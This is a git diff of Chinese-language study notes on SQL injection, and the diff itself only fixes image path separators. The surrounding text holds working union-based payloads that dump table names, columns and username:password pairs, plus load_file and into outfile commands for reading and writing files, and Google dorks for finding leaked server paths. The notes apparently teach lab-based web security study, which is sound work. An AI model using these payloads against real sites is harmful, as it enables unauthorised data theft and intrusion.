@@ -1,5 +1,5 @@
 ## SQL injection
-![](..\assets\img\sql-injection\20220804-161808.jpg)
+![](../assets/img/sql-injection/20220804-161808.jpg)
 
 （也可在用戶可輸入的地方，如form，加入非法SQL語句，從而進行非法SQL操作）
 
@@ -20,11 +20,11 @@
 SQL語句回顧
 查詢當前數據庫服務器所有的數據庫
 show databases;
-![](..\assets\img\sql-injection\20220804-161808-1.jpg)
+![](../assets/img/sql-injection/20220804-161808-1.jpg)
 use information_schema;
 show tables;
-![](..\assets\img\sql-injection\20220804-161808-2.jpg)
-![](..\assets\img\sql-injection\20220804-161808-3.jpg)
+![](../assets/img/sql-injection/20220804-161808-2.jpg)
+![](../assets/img/sql-injection/20220804-161808-3.jpg)
 
 union 查詢
 select * from t1 where is=-1 union select * from t1 where pass=111;
@@ -46,16 +46,16 @@ Information_schema庫
 	⁃	是信息數據庫
 	⁃	Web滲透過程中作用很大
 	⁃	❗️schemata表、tables表、columns表
-![](..\assets\img\sql-injection\20220804-161808-4.jpg)
+![](../assets/img/sql-injection/20220804-161808-4.jpg)
 use information_schema;
 select * from SCHEMATA;
-![](..\assets\img\sql-injection\20220804-161808-5.jpg)
+![](../assets/img/sql-injection/20220804-161808-5.jpg)
 select table_name from TABLES;
-![](..\assets\img\sql-injection\20220804-161808-6.jpg)
+![](../assets/img/sql-injection/20220804-161808-6.jpg)
 select column_name from COLUMNS;
 
-![](..\assets\img\sql-injection\20220804-161808-7.jpg)
-![](..\assets\img\sql-injection\20220804-161808-8.jpg)
+![](../assets/img/sql-injection/20220804-161808-7.jpg)
+![](../assets/img/sql-injection/20220804-161808-8.jpg)
 
 SQL注入
 數據庫類型：
@@ -101,7 +101,7 @@ Post: 利用server, 更安全 數據量更大
 	•	總共有3 columns
 	3.	報錯，判斷回顯點 union
 	•	?id=-1 union select 1,2,3
-	![](..\assets\img\sql-injection\20220804-161808-9.jpg)
+	![](../assets/img/sql-injection/20220804-161808-9.jpg)
 	4.	信息收集
 	‼️數據庫版本 version()
 	高版本：5.0以上 有系統庫 information_schema
@@ -114,27 +114,27 @@ Post: 利用server, 更安全 數據量更大
 
 查詢當前數據庫內的table名
 ?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
-![](..\assets\img\sql-injection\20220804-161808-10.jpg)
+![](../assets/img/sql-injection/20220804-161808-10.jpg)
 可見有‼️users這個table
 
 查詢users的column名
 ?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273
 ‼️分號裡面用0x加16進制 (users)
 ‼️=符號前後沒有空格
-![](..\assets\img\sql-injection\20220804-161808-11.jpg)
+![](../assets/img/sql-injection/20220804-161808-11.jpg)
 
 查詢users表內數據
 ?id=-1 union select 1,(select group_concat(username,0x3a,password) from users),3
 ❕0x3a是冒號
-![](..\assets\img\sql-injection\20220804-161808-12.jpg)
+![](../assets/img/sql-injection/20220804-161808-12.jpg)
 
 SQL注入之高權限注入
 最高權限：root
 多個網站共享一個database server
-![](..\assets\img\sql-injection\20220804-161808-13.jpg)
+![](../assets/img/sql-injection/20220804-161808-13.jpg)
 假如A出現漏洞，可以利用它去訪問在同一個伺服器上的數據庫B（前提是要有高權限)
 
-![](..\assets\img\sql-injection\20220804-161808-14.jpg)
+![](../assets/img/sql-injection/20220804-161808-14.jpg)
 
 ‼️顯示當前用戶
 ?id=-1 union select 1,user(),3
@@ -177,7 +177,7 @@ select * from user where user='root' and host='localhost'\G;
 💡進入root帳號給予user權限
 	⁃	GRANT ALL PRIVILEGES ON *.* TO 'user'@'localhost' WITH GRANT OPTION;
 
-![](..\assets\img\sql-injection\20220804-161808-15.jpg)
+![](../assets/img/sql-injection/20220804-161808-15.jpg)
 
 文件讀寫注入
 高版本的MYSQL添加了一個新的特性secure_file_priv，該選項限制了mysql導出文件的權限
@@ -187,15 +187,15 @@ select * from user where user='root' and host='localhost'\G;
 ❗️phpstudy重啟連接才會生效
 
 Win my.ini
-![](..\assets\img\sql-injection\20220804-161808-16.jpg)
+![](../assets/img/sql-injection/20220804-161808-16.jpg)
 Linux my.cnf
-![](..\assets\img\sql-injection\20220804-161808-17.jpg)
+![](../assets/img/sql-injection/20220804-161808-17.jpg)
 
 cmd mysql> show global variables like ‘%secure%’
 設定前
-![](..\assets\img\sql-injection\20220804-161808-18.jpg)
+![](../assets/img/sql-injection/20220804-161808-18.jpg)
 設定後
-![](..\assets\img\sql-injection\20220804-161808-19.jpg)
+![](../assets/img/sql-injection/20220804-161808-19.jpg)
 
 
 代表讀寫無限制 secure_file_priv=
@@ -204,19 +204,19 @@ cmd mysql> show global variables like ‘%secure%’
 設定後可以讀取文檔
 select load_file('C:/phpstudy_pro/Extensions/MySQL5.7.26/my.ini');
 ❗️斜桿，單引號或使用0x16進制
-![](..\assets\img\sql-injection\20220804-161808-20.jpg)
+![](../assets/img/sql-injection/20220804-161808-20.jpg)
 
 ‼️難點在於獲取文件路徑
 常見路徑
-![](..\assets\img\sql-injection\20220804-161808-21.jpg)
+![](../assets/img/sql-injection/20220804-161808-21.jpg)
 
 路徑獲取方式：
 報錯
 在google搜尋inurl:edu.mo warning
-![](..\assets\img\sql-injection\20220804-161808-22.jpg)
+![](../assets/img/sql-injection/20220804-161808-22.jpg)
 遺漏文件 可以看到php配置
 在google搜尋inurl:phpinfo.php
-![](..\assets\img\sql-injection\20220804-161808-23.jpg)
+![](../assets/img/sql-injection/20220804-161808-23.jpg)
 
 SQL文件注入
 ?id=-1 union select 'hack','your','brain' into outfile 'c:/yo.txt'--+
@@ -243,10 +243,10 @@ SQL注入之數據類型
 	⁃	數據正常顯示 有注入點
 	•	?id=1 and 1=2
 	⁃	報錯 有注入點, 沒報錯 沒注入點
-	![](..\assets\img\sql-injection\20220804-161809.jpg)
+	![](../assets/img/sql-injection/20220804-161809.jpg)
 
 	2.	字符型數據
-![](..\assets\img\sql-injection\20220804-161809-1.jpg)
+![](../assets/img/sql-injection/20220804-161809-1.jpg)
 id被代入為'1 and 1=2'，SQL會過濾1之後的字符，因此會正常顯示id=1的數據不會報錯，無法判斷是否有注入點
 ‼️字符型判斷方法：
 ?id=1' 加入單/雙引號，報錯 有注入點
@@ -256,10 +256,10 @@ id被代入為'1 and 1=2'，SQL會過濾1之後的字符，因此會正常顯示
 	3.	搜索型數據
 like 模糊查詢
 % % 通配符
-![](..\assets\img\sql-injection\20220804-161809-2.jpg)
+![](../assets/img/sql-injection/20220804-161809-2.jpg)
 ‼️方法：
 ?username=y%’ or 1=1#
-![](..\assets\img\sql-injection\20220804-161809-3.jpg)
+![](../assets/img/sql-injection/20220804-161809-3.jpg)
 💡or 1=1的功效：顯示所有結果
 
 	4.	其他型數據
@@ -281,7 +281,7 @@ get注入方式比較常見，主要是通過url中傳輸數據到後台，帶�
 	⁃	長度不限
 	⁃	速度不快
 
-![](..\assets\img\sql-injection\20220804-161809-4.jpg)
+![](../assets/img/sql-injection/20220804-161809-4.jpg)
 抓包工具可以顯示post的parameter
 
 	3.	Cookie提交 (sqli-labs Less-20)
@@ -291,15 +291,15 @@ $c=$_COOKIE['s'];
 好處：能繞過POST的check_input
 
 利用Burp Suite修改header值，在此進行SQL injection
-![](..\assets\img\sql-injection\20220804-161809-5.jpg)
+![](../assets/img/sql-injection/20220804-161809-5.jpg)
 在header中加入Cookie: 參數=2222
 
 Google chrome的開發人員工作也能查詢cookie值
-![](..\assets\img\sql-injection\20220804-161809-6.jpg)
+![](../assets/img/sql-injection/20220804-161809-6.jpg)
 
 	4.	Request式注入
-![](..\assets\img\sql-injection\20220804-161809-7.jpg)
+![](../assets/img/sql-injection/20220804-161809-7.jpg)
 
 Server函數
 利用Server function獲取多項訊息
-![](..\assets\img\sql-injection\20220804-161809-8.jpg)
+![](../assets/img/sql-injection/20220804-161809-8.jpg)
